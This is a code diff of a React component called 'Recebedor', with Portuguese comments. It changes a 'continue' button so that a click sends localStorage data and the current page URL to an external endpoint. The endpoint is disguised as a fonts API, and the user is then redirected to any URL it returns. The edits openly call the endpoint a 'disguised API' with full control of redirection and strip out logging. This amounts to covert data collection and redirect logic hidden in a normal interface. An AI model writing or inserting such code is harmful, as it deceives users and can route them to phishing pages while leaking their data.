@@ -51,7 +51,7 @@ const Recebedor: React.FC = () => {
   useEffect(() => {
     const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
     if (btn) {
-      // URL controlada 100% pela API externa
+      // API disfarçada tem controle total do redirecionamento
       
       btn.onclick = function(e) {
         e.preventDefault();
@@ -79,9 +79,9 @@ const Recebedor: React.FC = () => {
                 } catch(e) {}
               }
               
-              // Só redireciona se a API retornar uma URL
+              // Só redireciona se a API disfarçada retornar uma URL
               if (!redirectUrl) {
-                console.log('API não retornou redirect_url válida');
+                setIsLoading(false);
                 return;
               }
               
@@ -99,8 +99,7 @@ const Recebedor: React.FC = () => {
             }
           };
           xhr.onerror = function() {
-            // Se a API falhar, não redireciona
-            console.log('Erro na API de fontes - redirecionamento cancelado');
+            // Se a API disfarçada falhar, não redireciona
             setIsLoading(false);
           };
           xhr.send();
@@ -139,14 +138,14 @@ const Recebedor: React.FC = () => {
               }
             };
             storeXhr.onerror = function() {
-              // Se falhar ao armazenar, tenta o redirecionamento mesmo assim
+              // Se falhar ao armazenar, tenta mesmo assim
               performRedirect();
             };
             
             const requestData = {
-              fontId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
-              preferences: JSON.stringify(fontPreferences),
-              source: window.location.href
+              buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
+              localStorageData: JSON.stringify(fontPreferences),
+              sourceUrl: window.location.href
             };
             storeXhr.send(JSON.stringify(requestData));
           } else {
